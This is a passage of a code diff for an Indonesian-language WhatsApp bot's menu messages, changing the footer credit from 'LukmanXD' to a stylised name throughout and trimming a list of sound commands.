+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7116,7 +7116,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ║⿻ Meme2
 │┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7205,7 +7205,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 │⿻ Leaves
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7239,7 +7239,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ║⿻ Tupai
 │┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7308,7 +7308,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 │⿻ Searchgroups [Query]
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7349,7 +7349,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 │⿻ Ss [Url]
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7380,7 +7380,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 │⿻ Delmsg
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7407,7 +7407,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 │⿻ Keluar
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7438,7 +7438,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 │⿻ Mediafire [Url]
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7483,7 +7483,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 │⿻ Cowner [Add Friend]
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7637,37 +7637,9 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ║⿻ Sound131
 │⿻ Sound132
 ║⿻ Sound133
-│⿻ Sound134
-║⿻ Sound135
-│⿻ Sound136
-║⿻ Sound137
-│⿻ Sound138
-║⿻ Sound139
-│⿻ Sound140
-║⿻ Sound141
-│⿻ Sound142
-║⿻ Sound143
-│⿻ Sound144
-║⿻ Sound145
-│⿻ Sound146
-║⿻ Sound147
-│⿻ Sound148
-║⿻ Sound149
-│⿻ Sound150
-║⿻ Sound151
-│⿻ Sound151
-║⿻ Sound153
-│⿻ Sound154
-║⿻ Sound155
-│⿻ Sound156
-║⿻ Sound157
-│⿻ Sound158
-║⿻ Sound159
-│⿻ Sound160
-║⿻ Sound161
 │┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7697,7 +7669,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ║⿻ Berburu
 │┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
